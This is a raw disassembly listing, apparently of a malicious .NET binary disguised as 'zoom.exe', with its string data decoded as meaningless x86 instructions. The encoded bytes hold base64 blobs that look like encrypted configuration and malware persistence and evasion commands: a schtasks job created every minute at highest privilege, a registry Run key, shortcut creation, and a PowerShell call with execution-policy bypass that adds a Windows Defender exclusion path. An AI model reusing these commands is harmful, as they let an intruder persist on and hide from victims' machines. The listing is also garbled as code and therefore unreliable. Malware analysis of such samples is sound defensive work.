  409ad8:	6d                   	insl   (%dx),%es:(%edi)
  409ad9:	65 43                	gs inc %ebx
  409adb:	6f                   	outsl  %ds:(%esi),(%dx)
  409adc:	6d                   	insl   (%dx),%es:(%edi)
  409add:	70 61                	jo     0x409b40
  409adf:	74 69                	je     0x409b4a
  409ae1:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  409ae4:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  409aeb:	69 
  409aec:	62 75 74             	bound  %esi,0x74(%ebp)
  409aef:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  409af3:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  409afa:	62 
  409afb:	75 74                	jne    0x409b71
  409afd:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409b01:	73 65                	jae    0x409b68
  409b03:	6d                   	insl   (%dx),%es:(%edi)
  409b04:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  409b08:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  409b0f:	69 
  409b10:	6f                   	outsl  %ds:(%esi),(%dx)
  409b11:	6e                   	outsb  %ds:(%esi),(%dx)
  409b12:	41                   	inc    %ecx
  409b13:	74 74                	je     0x409b89
  409b15:	72 69                	jb     0x409b80
  409b17:	62 75 74             	bound  %esi,0x74(%ebp)
  409b1a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409b1e:	73 65                	jae    0x409b85
  409b20:	6d                   	insl   (%dx),%es:(%edi)
  409b21:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  409b25:	72 61                	jb     0x409b88
  409b27:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  409b2a:	61                   	popa
  409b2b:	72 6b                	jb     0x409b98
  409b2d:	41                   	inc    %ecx
  409b2e:	74 74                	je     0x409ba4
  409b30:	72 69                	jb     0x409b9b
  409b32:	62 75 74             	bound  %esi,0x74(%ebp)
  409b35:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409b39:	73 65                	jae    0x409ba0
  409b3b:	6d                   	insl   (%dx),%es:(%edi)
  409b3c:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409b40:	6f                   	outsl  %ds:(%esi),(%dx)
  409b41:	70 79                	jo     0x409bbc
  409b43:	72 69                	jb     0x409bae
  409b45:	67 68 74 41 74 74    	addr16 push $0x74744174
  409b4b:	72 69                	jb     0x409bb6
  409b4d:	62 75 74             	bound  %esi,0x74(%ebp)
  409b50:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409b54:	73 65                	jae    0x409bbb
  409b56:	6d                   	insl   (%dx),%es:(%edi)
  409b57:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  409b5b:	72 6f                	jb     0x409bcc
  409b5d:	64 75 63             	fs jne 0x409bc3
  409b60:	74 41                	je     0x409ba3
  409b62:	74 74                	je     0x409bd8
  409b64:	72 69                	jb     0x409bcf
  409b66:	62 75 74             	bound  %esi,0x74(%ebp)
  409b69:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409b6d:	73 65                	jae    0x409bd4
  409b6f:	6d                   	insl   (%dx),%es:(%edi)
  409b70:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  409b74:	6f                   	outsl  %ds:(%esi),(%dx)
  409b75:	6d                   	insl   (%dx),%es:(%edi)
  409b76:	70 61                	jo     0x409bd9
  409b78:	6e                   	outsb  %ds:(%esi),(%dx)
  409b79:	79 41                	jns    0x409bbc
  409b7b:	74 74                	je     0x409bf1
  409b7d:	72 69                	jb     0x409be8
  409b7f:	62 75 74             	bound  %esi,0x74(%ebp)
  409b82:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  409b86:	73 65                	jae    0x409bed
  409b88:	6d                   	insl   (%dx),%es:(%edi)
  409b89:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  409b8d:	65 73 63             	gs jae 0x409bf3
  409b90:	72 69                	jb     0x409bfb
  409b92:	70 74                	jo     0x409c08
  409b94:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  409b9b:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  409ba2:	73 73                	jae    0x409c17
  409ba4:	65 6d                	gs insl (%dx),%es:(%edi)
  409ba6:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  409baa:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  409bb1:	72 
  409bb2:	69 62 75 74 65 00 7a 	imul   $0x7a006574,0x75(%edx),%esp
  409bb9:	6f                   	outsl  %ds:(%esi),(%dx)
  409bba:	6f                   	outsl  %ds:(%esi),(%dx)
  409bbb:	6d                   	insl   (%dx),%es:(%edi)
  409bbc:	00 7a 6f             	add    %bh,0x6f(%edx)
  409bbf:	6f                   	outsl  %ds:(%esi),(%dx)
  409bc0:	6d                   	insl   (%dx),%es:(%edi)
  409bc1:	2e 65 78 65          	cs js,pn 0x409c2a
  409bc5:	00 00                	add    %al,(%eax)
  409bc7:	00 00                	add    %al,(%eax)
  409bc9:	59                   	pop    %ecx
  409bca:	63 00                	arpl   %eax,(%eax)
  409bcc:	59                   	pop    %ecx
  409bcd:	00 49 00             	add    %cl,0x0(%ecx)
  409bd0:	7a 00                	jp     0x409bd2
  409bd2:	59                   	pop    %ecx
  409bd3:	00 36                	add    %dh,(%esi)
  409bd5:	00 47 00             	add    %al,0x0(%edi)
  409bd8:	70 00                	jo     0x409bda
  409bda:	52                   	push   %edx
  409bdb:	00 68 00             	add    %ch,0x0(%eax)
  409bde:	74 00                	je     0x409be0
  409be0:	7a 00                	jp     0x409be2
  409be2:	76 00                	jbe    0x409be4
  409be4:	69 00 2f 00 31 00    	imul   $0x31002f,(%eax),%eax
  409bea:	72 00                	jb     0x409bec
  409bec:	79 00                	jns    0x409bee
  409bee:	4b                   	dec    %ebx
  409bef:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  409bf3:	00 56 00             	add    %dl,0x0(%esi)
  409bf6:	72 00                	jb     0x409bf8
  409bf8:	4b                   	dec    %ebx
  409bf9:	00 4d 00             	add    %cl,0x0(%ebp)
  409bfc:	56                   	push   %esi
  409bfd:	00 4b 00             	add    %cl,0x0(%ebx)
  409c00:	34 00                	xor    $0x0,%al
  409c02:	4d                   	dec    %ebp
  409c03:	00 6e 00             	add    %ch,0x0(%esi)
  409c06:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  409c09:	00 38                	add    %bh,(%eax)
  409c0b:	00 49 00             	add    %cl,0x0(%ecx)
  409c0e:	45                   	inc    %ebp
  409c0f:	00 6b 00             	add    %ch,0x0(%ebx)
  409c12:	44                   	inc    %esp
  409c13:	00 67 00             	add    %ah,0x0(%edi)
  409c16:	69 00 70 00 6c 00    	imul   $0x6c0070,(%eax),%eax
  409c1c:	51                   	push   %ecx
  409c1d:	00 73 00             	add    %dh,0x0(%ebx)
  409c20:	3d 00 00 31 64       	cmp    $0x64310000,%eax
  409c25:	00 78 00             	add    %bh,0x0(%eax)
  409c28:	69 00 62 00 48 00    	imul   $0x480062,(%eax),%eax
  409c2e:	44                   	inc    %esp
  409c2f:	00 38                	add    %bh,(%eax)
  409c31:	00 4e 00             	add    %cl,0x0(%esi)
  409c34:	62 00                	bound  %eax,(%eax)
  409c36:	58                   	pop    %eax
  409c37:	00 33                	add    %dh,(%ebx)
  409c39:	00 37                	add    %dh,(%edi)
  409c3b:	00 71 00             	add    %dh,0x0(%ecx)
  409c3e:	6b 00 56             	imul   $0x56,(%eax),%eax
  409c41:	00 4d 00             	add    %cl,0x0(%ebp)
  409c44:	37                   	aaa
  409c45:	00 4f 00             	add    %cl,0x0(%edi)
  409c48:	53                   	push   %ebx
  409c49:	00 67 00             	add    %ah,0x0(%edi)
  409c4c:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  409c50:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409c55:	31 69 00             	xor    %ebp,0x0(%ecx)
  409c58:	4e                   	dec    %esi
  409c59:	00 55 00             	add    %dl,0x0(%ebp)
  409c5c:	79 00                	jns    0x409c5e
  409c5e:	4f                   	dec    %edi
  409c5f:	00 39                	add    %bh,(%ecx)
  409c61:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409c65:	00 46 00             	add    %al,0x0(%esi)
  409c68:	79 00                	jns    0x409c6a
  409c6a:	68 00 52 00 6c       	push   $0x6c005200
  409c6f:	00 45 00             	add    %al,0x0(%ebp)
  409c72:	51                   	push   %ecx
  409c73:	00 68 00             	add    %ch,0x0(%eax)
  409c76:	4b                   	dec    %ebx
  409c77:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  409c7b:	00 62 00             	add    %ah,0x0(%edx)
  409c7e:	30 00                	xor    %al,(%eax)
  409c80:	77 00                	ja     0x409c82
  409c82:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409c87:	31 77 00             	xor    %esi,0x0(%edi)
  409c8a:	6a 00                	push   $0x0
  409c8c:	62 00                	bound  %eax,(%eax)
  409c8e:	73 00                	jae    0x409c90
  409c90:	53                   	push   %ebx
  409c91:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  409c95:	00 65 00             	add    %ah,0x0(%ebp)
  409c98:	54                   	push   %esp
  409c99:	00 51 00             	add    %dl,0x0(%ecx)
  409c9c:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  409ca0:	6f                   	outsl  %ds:(%esi),(%dx)
  409ca1:	00 53 00             	add    %dl,0x0(%ebx)
  409ca4:	46                   	inc    %esi
  409ca5:	00 68 00             	add    %ch,0x0(%eax)
  409ca8:	43                   	inc    %ebx
  409ca9:	00 66 00             	add    %ah,0x0(%esi)
  409cac:	57                   	push   %edi
  409cad:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  409cb1:	00 41 00             	add    %al,0x0(%ecx)
  409cb4:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409cb9:	03 31                	add    (%ecx),%esi
  409cbb:	00 00                	add    %al,(%eax)
  409cbd:	59                   	pop    %ecx
  409cbe:	4f                   	dec    %edi
  409cbf:	00 57 00             	add    %dl,0x0(%edi)
  409cc2:	52                   	push   %edx
  409cc3:	00 4d 00             	add    %cl,0x0(%ebp)
  409cc6:	42                   	inc    %edx
  409cc7:	00 2b                	add    %ch,(%ebx)
  409cc9:	00 64 00 35          	add    %ah,0x35(%eax,%eax,1)
  409ccd:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
  409cd1:	00 6a 00             	add    %ch,0x0(%edx)
  409cd4:	42                   	inc    %edx
  409cd5:	00 35 00 37 00 7a    	add    %dh,0x7a003700
  409cdb:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  409cdf:	00 42 00             	add    %al,0x0(%edx)
  409ce2:	75 00                	jne    0x409ce4
  409ce4:	49                   	dec    %ecx
  409ce5:	00 47 00             	add    %al,0x0(%edi)
  409ce8:	32 00                	xor    (%eax),%al
  409cea:	45                   	inc    %ebp
  409ceb:	00 4d 00             	add    %cl,0x0(%ebp)
  409cee:	65 00 32             	add    %dh,%gs:(%edx)
  409cf1:	00 7a 00             	add    %bh,0x0(%edx)
  409cf4:	45                   	inc    %ebp
  409cf5:	00 61 00             	add    %ah,0x0(%ecx)
  409cf8:	57                   	push   %edi
  409cf9:	00 71 00             	add    %dh,0x0(%ecx)
  409cfc:	56                   	push   %esi
  409cfd:	00 36                	add    %dh,(%esi)
  409cff:	00 31                	add    %dh,(%ecx)
  409d01:	00 78 00             	add    %bh,0x0(%eax)
  409d04:	52                   	push   %edx
  409d05:	00 66 00             	add    %ah,0x0(%esi)
  409d08:	47                   	inc    %edi
  409d09:	00 6e 00             	add    %ch,0x0(%esi)
  409d0c:	68 00 71 00 59       	push   $0x59007100
  409d11:	00 4d 00             	add    %cl,0x0(%ebp)
  409d14:	3d 00 00 31 46       	cmp    $0x46310000,%eax
  409d19:	00 2f                	add    %ch,(%edi)
  409d1b:	00 61 00             	add    %ah,0x0(%ecx)
  409d1e:	41                   	inc    %ecx
  409d1f:	00 56 00             	add    %dl,0x0(%esi)
  409d22:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  409d26:	70 00                	jo     0x409d28
  409d28:	74 00                	je     0x409d2a
  409d2a:	4c                   	dec    %esp
  409d2b:	00 4b 00             	add    %cl,0x0(%ebx)
  409d2e:	44                   	inc    %esp
  409d2f:	00 2b                	add    %ch,(%ebx)
  409d31:	00 53 00             	add    %dl,0x0(%ebx)
  409d34:	46                   	inc    %esi
  409d35:	00 62 00             	add    %ah,0x0(%edx)
  409d38:	37                   	aaa
  409d39:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  409d3d:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  409d41:	00 51 00             	add    %dl,0x0(%ecx)
  409d44:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409d49:	31 64 00 6d          	xor    %esp,0x6d(%eax,%eax,1)
  409d4d:	00 4d 00             	add    %cl,0x0(%ebp)
  409d50:	34 00                	xor    $0x0,%al
  409d52:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  409d56:	31 00                	xor    %eax,(%eax)
  409d58:	59                   	pop    %ecx
  409d59:	00 6d 00             	add    %ch,0x0(%ebp)
  409d5c:	70 00                	jo     0x409d5e
  409d5e:	47                   	inc    %edi
  409d5f:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  409d63:	00 77 00             	add    %dh,0x0(%edi)
  409d66:	5a                   	pop    %edx
  409d67:	00 5a 00             	add    %bl,0x0(%edx)
  409d6a:	6e                   	outsb  %ds:(%esi),(%dx)
  409d6b:	00 43 00             	add    %al,0x0(%ebx)
  409d6e:	55                   	push   %ebp
  409d6f:	00 6d 00             	add    %ch,0x0(%ebp)
  409d72:	63 00                	arpl   %eax,(%eax)
  409d74:	41                   	inc    %ecx
  409d75:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  409d7b:	31 69 00             	xor    %ebp,0x0(%ecx)
  409d7e:	6d                   	insl   (%dx),%es:(%edi)
  409d7f:	00 66 00             	add    %ah,0x0(%esi)
  409d82:	6d                   	insl   (%dx),%es:(%edi)
  409d83:	00 62 00             	add    %ah,0x0(%edx)
  409d86:	43                   	inc    %ebx
  409d87:	00 48 00             	add    %cl,0x0(%eax)
  409d8a:	45                   	inc    %ebp
  409d8b:	00 34 00             	add    %dh,(%eax,%eax,1)
  409d8e:	38 00                	cmp    %al,(%eax)
  409d90:	59                   	pop    %ecx
  409d91:	00 72 00             	add    %dh,0x0(%edx)
  409d94:	4a                   	dec    %edx
  409d95:	00 6b 00             	add    %ch,0x0(%ebx)
  409d98:	44                   	inc    %esp
  409d99:	00 75 00             	add    %dh,0x0(%ebp)
  409d9c:	74 00                	je     0x409d9e
  409d9e:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  409da2:	31 00                	xor    %eax,(%eax)
  409da4:	7a 00                	jp     0x409da6
  409da6:	77 00                	ja     0x409da8
  409da8:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409dad:	21 57 00             	and    %edx,0x0(%edi)
  409db0:	7a 00                	jp     0x409db2
  409db2:	52                   	push   %edx
  409db3:	00 32                	add    %dh,(%edx)
  409db5:	00 76 00             	add    %dh,0x0(%esi)
  409db8:	78 00                	js     0x409dba
  409dba:	4f                   	dec    %edi
  409dbb:	00 55 00             	add    %dl,0x0(%ebp)
  409dbe:	53                   	push   %ebx
  409dbf:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  409dc3:	00 30                	add    %dh,(%eax)
  409dc5:	00 4d 00             	add    %cl,0x0(%ebp)
  409dc8:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  409dcc:	75 00                	jne    0x409dce
  409dce:	00 09                	add    %cl,(%ecx)
  409dd0:	74 00                	je     0x409dd2
  409dd2:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409dd6:	70 00                	jo     0x409dd8
  409dd8:	00 11                	add    %dl,(%ecx)
  409dda:	5c                   	pop    %esp
  409ddb:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  409ddf:	00 67 00             	add    %ah,0x0(%edi)
  409de2:	2e 00 74 00 6d       	add    %dh,%cs:0x6d(%eax,%eax,1)
  409de7:	00 70 00             	add    %dh,0x0(%eax)
  409dea:	00 03                	add    %al,(%ebx)
  409dec:	5c                   	pop    %esp
  409ded:	00 00                	add    %al,(%eax)
  409def:	19 73 00             	sbb    %esi,0x0(%ebx)
  409df2:	63 00                	arpl   %eax,(%eax)
  409df4:	68 00 74 00 61       	push   $0x61007400
  409df9:	00 73 00             	add    %dh,0x0(%ebx)
  409dfc:	6b 00 73             	imul   $0x73,(%eax),%eax
  409dff:	00 2e                	add    %ch,(%esi)
  409e01:	00 65 00             	add    %ah,0x0(%ebp)
  409e04:	78 00                	js     0x409e06
  409e06:	65 00 00             	add    %al,%gs:(%eax)
  409e09:	5b                   	pop    %ebx
  409e0a:	2f                   	das
  409e0b:	00 63 00             	add    %ah,0x0(%ebx)
  409e0e:	72 00                	jb     0x409e10
  409e10:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409e14:	74 00                	je     0x409e16
  409e16:	65 00 20             	add    %ah,%gs:(%eax)
  409e19:	00 2f                	add    %ch,(%edi)
  409e1b:	00 66 00             	add    %ah,0x0(%esi)
  409e1e:	20 00                	and    %al,(%eax)
  409e20:	2f                   	das
  409e21:	00 52 00             	add    %dl,0x0(%edx)
  409e24:	4c                   	dec    %esp
  409e25:	00 20                	add    %ah,(%eax)
  409e27:	00 48 00             	add    %cl,0x0(%eax)
  409e2a:	49                   	dec    %ecx
  409e2b:	00 47 00             	add    %al,0x0(%edi)
  409e2e:	48                   	dec    %eax
  409e2f:	00 45 00             	add    %al,0x0(%ebp)
  409e32:	53                   	push   %ebx
  409e33:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  409e37:	00 2f                	add    %ch,(%edi)
  409e39:	00 73 00             	add    %dh,0x0(%ebx)
  409e3c:	63 00                	arpl   %eax,(%eax)
  409e3e:	20 00                	and    %al,(%eax)
  409e40:	6d                   	insl   (%dx),%es:(%edi)
  409e41:	00 69 00             	add    %ch,0x0(%ecx)
  409e44:	6e                   	outsb  %ds:(%esi),(%dx)
  409e45:	00 75 00             	add    %dh,0x0(%ebp)
  409e48:	74 00                	je     0x409e4a
  409e4a:	65 00 20             	add    %ah,%gs:(%eax)
  409e4d:	00 2f                	add    %ch,(%edi)
  409e4f:	00 6d 00             	add    %ch,0x0(%ebp)
  409e52:	6f                   	outsl  %ds:(%esi),(%dx)
  409e53:	00 20                	add    %ah,(%eax)
  409e55:	00 31                	add    %dh,(%ecx)
  409e57:	00 20                	add    %ah,(%eax)
  409e59:	00 2f                	add    %ch,(%edi)
  409e5b:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  409e5f:	00 20                	add    %ah,(%eax)
  409e61:	00 22                	add    %ah,(%edx)
  409e63:	00 00                	add    %al,(%eax)
  409e65:	0f 22 00             	mov    %eax,%cr0
  409e68:	20 00                	and    %al,(%eax)
  409e6a:	2f                   	das
  409e6b:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  409e6f:	00 20                	add    %ah,(%eax)
  409e71:	00 22                	add    %ah,(%edx)
  409e73:	00 00                	add    %al,(%eax)
  409e75:	03 22                	add    (%edx),%esp
  409e77:	00 00                	add    %al,(%eax)
  409e79:	43                   	inc    %ebx
  409e7a:	2f                   	das
  409e7b:	00 63 00             	add    %ah,0x0(%ebx)
  409e7e:	72 00                	jb     0x409e80
  409e80:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409e84:	74 00                	je     0x409e86
  409e86:	65 00 20             	add    %ah,%gs:(%eax)
  409e89:	00 2f                	add    %ch,(%edi)
  409e8b:	00 66 00             	add    %ah,0x0(%esi)
  409e8e:	20 00                	and    %al,(%eax)
  409e90:	2f                   	das
  409e91:	00 73 00             	add    %dh,0x0(%ebx)
  409e94:	63 00                	arpl   %eax,(%eax)
  409e96:	20 00                	and    %al,(%eax)
  409e98:	6d                   	insl   (%dx),%es:(%edi)
  409e99:	00 69 00             	add    %ch,0x0(%ecx)
  409e9c:	6e                   	outsb  %ds:(%esi),(%dx)
  409e9d:	00 75 00             	add    %dh,0x0(%ebp)
  409ea0:	74 00                	je     0x409ea2
  409ea2:	65 00 20             	add    %ah,%gs:(%eax)
  409ea5:	00 2f                	add    %ch,(%edi)
  409ea7:	00 6d 00             	add    %ch,0x0(%ebp)
  409eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  409eab:	00 20                	add    %ah,(%eax)
  409ead:	00 31                	add    %dh,(%ecx)
  409eaf:	00 20                	add    %ah,(%eax)
  409eb1:	00 2f                	add    %ch,(%edi)
  409eb3:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  409eb7:	00 20                	add    %ah,(%eax)
  409eb9:	00 22                	add    %ah,(%edx)
  409ebb:	00 00                	add    %al,(%eax)
  409ebd:	5b                   	pop    %ebx
  409ebe:	53                   	push   %ebx
  409ebf:	00 4f 00             	add    %cl,0x0(%edi)
  409ec2:	46                   	inc    %esi
  409ec3:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  409ec7:	00 41 00             	add    %al,0x0(%ecx)
  409eca:	52                   	push   %edx
  409ecb:	00 45 00             	add    %al,0x0(%ebp)
  409ece:	5c                   	pop    %esp
  409ecf:	00 4d 00             	add    %cl,0x0(%ebp)
  409ed2:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  409ed8:	6f                   	outsl  %ds:(%esi),(%dx)
  409ed9:	00 73 00             	add    %dh,0x0(%ebx)
  409edc:	6f                   	outsl  %ds:(%esi),(%dx)
  409edd:	00 66 00             	add    %ah,0x0(%esi)
  409ee0:	74 00                	je     0x409ee2
  409ee2:	5c                   	pop    %esp
  409ee3:	00 57 00             	add    %dl,0x0(%edi)
  409ee6:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  409eec:	6f                   	outsl  %ds:(%esi),(%dx)
  409eed:	00 77 00             	add    %dh,0x0(%edi)
  409ef0:	73 00                	jae    0x409ef2
  409ef2:	5c                   	pop    %esp
  409ef3:	00 43 00             	add    %al,0x0(%ebx)
  409ef6:	75 00                	jne    0x409ef8
  409ef8:	72 00                	jb     0x409efa
  409efa:	72 00                	jb     0x409efc
  409efc:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409f00:	74 00                	je     0x409f02
  409f02:	56                   	push   %esi
  409f03:	00 65 00             	add    %ah,0x0(%ebp)
  409f06:	72 00                	jb     0x409f08
  409f08:	73 00                	jae    0x409f0a
  409f0a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409f10:	5c                   	pop    %esp
  409f11:	00 52 00             	add    %dl,0x0(%edx)
  409f14:	75 00                	jne    0x409f16
  409f16:	6e                   	outsb  %ds:(%esi),(%dx)
  409f17:	00 00                	add    %al,(%eax)
  409f19:	09 2e                	or     %ebp,(%esi)
  409f1b:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  409f1f:	00 6b 00             	add    %ch,0x0(%ebx)
  409f22:	00 1b                	add    %bl,(%ebx)
  409f24:	57                   	push   %edi
  409f25:	00 53 00             	add    %dl,0x0(%ebx)
  409f28:	63 00                	arpl   %eax,(%eax)
  409f2a:	72 00                	jb     0x409f2c
  409f2c:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  409f32:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  409f36:	68 00 65 00 6c       	push   $0x6c006500
  409f3b:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  409f3f:	01 00                	add    %eax,(%eax)
  409f41:	1d 43 00 72 00       	sbb    $0x720043,%eax
  409f46:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409f4a:	74 00                	je     0x409f4c
  409f4c:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  409f50:	68 00 6f 00 72       	push   $0x72006f00
  409f55:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  409f59:	00 75 00             	add    %dh,0x0(%ebp)
  409f5c:	74 00                	je     0x409f5e
  409f5e:	00 15 54 00 61 00    	add    %dl,0x610054
  409f64:	72 00                	jb     0x409f66
  409f66:	67 00 65 00          	add    %ah,0x0(%di)
  409f6a:	74 00                	je     0x409f6c
  409f6c:	50                   	push   %eax
  409f6d:	00 61 00             	add    %ah,0x0(%ecx)
  409f70:	74 00                	je     0x409f72
  409f72:	68 00 00 21 57       	push   $0x57210000
  409f77:	00 6f 00             	add    %ch,0x0(%edi)
  409f7a:	72 00                	jb     0x409f7c
  409f7c:	6b 00 69             	imul   $0x69,(%eax),%eax
  409f7f:	00 6e 00             	add    %ch,0x0(%esi)
  409f82:	67 00 44 00          	add    %al,0x0(%si)
  409f86:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  409f8c:	63 00                	arpl   %eax,(%eax)
  409f8e:	74 00                	je     0x409f90
  409f90:	6f                   	outsl  %ds:(%esi),(%dx)
  409f91:	00 72 00             	add    %dh,0x0(%edx)
  409f94:	79 00                	jns    0x409f96
  409f96:	00 09                	add    %cl,(%ecx)
  409f98:	53                   	push   %ebx
  409f99:	00 61 00             	add    %ah,0x0(%ecx)
  409f9c:	76 00                	jbe    0x409f9e
  409f9e:	65 00 00             	add    %al,%gs:(%eax)
  409fa1:	1d 70 00 6f 00       	sbb    $0x6f0070,%eax
  409fa6:	77 00                	ja     0x409fa8
  409fa8:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409fac:	73 00                	jae    0x409fae
  409fae:	68 00 65 00 6c       	push   $0x6c006500
  409fb3:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  409fb7:	00 65 00             	add    %ah,0x0(%ebp)
  409fba:	78 00                	js     0x409fbc
  409fbc:	65 00 00             	add    %al,%gs:(%eax)
  409fbf:	73 2d                	jae    0x409fee
  409fc1:	00 45 00             	add    %al,0x0(%ebp)
  409fc4:	78 00                	js     0x409fc6
  409fc6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409fca:	75 00                	jne    0x409fcc
  409fcc:	74 00                	je     0x409fce
  409fce:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409fd4:	50                   	push   %eax
  409fd5:	00 6f 00             	add    %ch,0x0(%edi)
  409fd8:	6c                   	insb   (%dx),%es:(%edi)
  409fd9:	00 69 00             	add    %ch,0x0(%ecx)
  409fdc:	63 00                	arpl   %eax,(%eax)
  409fde:	79 00                	jns    0x409fe0
  409fe0:	20 00                	and    %al,(%eax)
  409fe2:	42                   	inc    %edx
  409fe3:	00 79 00             	add    %bh,0x0(%ecx)
  409fe6:	70 00                	jo     0x409fe8
  409fe8:	61                   	popa
  409fe9:	00 73 00             	add    %dh,0x0(%ebx)
  409fec:	73 00                	jae    0x409fee
  409fee:	20 00                	and    %al,(%eax)
  409ff0:	41                   	inc    %ecx
  409ff1:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  409ff5:	00 2d 00 4d 00 70    	add    %ch,0x70004d00
  409ffb:	00 50 00             	add    %dl,0x0(%eax)
  409ffe:	72 00                	jb     0x40a000
  40a000:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40a004:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a008:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40a00c:	63 00                	arpl   %eax,(%eax)
  40a00e:	65 00 20             	add    %ah,%gs:(%eax)
  40a011:	00 2d 00 45 00 78    	add    %ch,0x78004500
  40a017:	00 63 00             	add    %ah,0x0(%ebx)
  40a01a:	6c                   	insb   (%dx),%es:(%edi)
  40a01b:	00 75 00             	add    %dh,0x0(%ebp)
  40a01e:	73 00                	jae    0x40a020
  40a020:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a026:	50                   	push   %eax
  40a027:	00 61 00             	add    %ah,0x0(%ecx)
  40a02a:	74 00                	je     0x40a02c
  40a02c:	68 00 20 00 27       	push   $0x27002000
  40a031:	00 01                	add    %al,(%ecx)
  40a033:	03 27                	add    (%edi),%esp
  40a035:	00 01                	add    %al,(%ecx)
  40a037:	79 2d                	jns    0x40a066
  40a039:	00 45 00             	add    %al,0x0(%ebp)
  40a03c:	78 00                	js     0x40a03e
  40a03e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a042:	75 00                	jne    0x40a044
  40a044:	74 00                	je     0x40a046
  40a046:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a04c:	50                   	push   %eax
  40a04d:	00 6f 00             	add    %ch,0x0(%edi)
  40a050:	6c                   	insb   (%dx),%es:(%edi)
  40a051:	00 69 00             	add    %ch,0x0(%ecx)
  40a054:	63 00                	arpl   %eax,(%eax)
  40a056:	79 00                	jns    0x40a058
  40a058:	20 00                	and    %al,(%eax)
  40a05a:	42                   	inc    %edx
  40a05b:	00 79 00             	add    %bh,0x0(%ecx)
  40a05e:	70 00                	jo     0x40a060
  40a060:	61                   	popa
  40a061:	00 73 00             	add    %dh,0x0(%ebx)
  40a064:	73 00                	jae    0x40a066
  40a066:	20 00                	and    %al,(%eax)
  40a068:	41                   	inc    %ecx
  40a069:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40a06d:	00 2d 00 4d 00 70    	add    %ch,0x70004d00
  40a073:	00 50 00             	add    %dl,0x0(%eax)
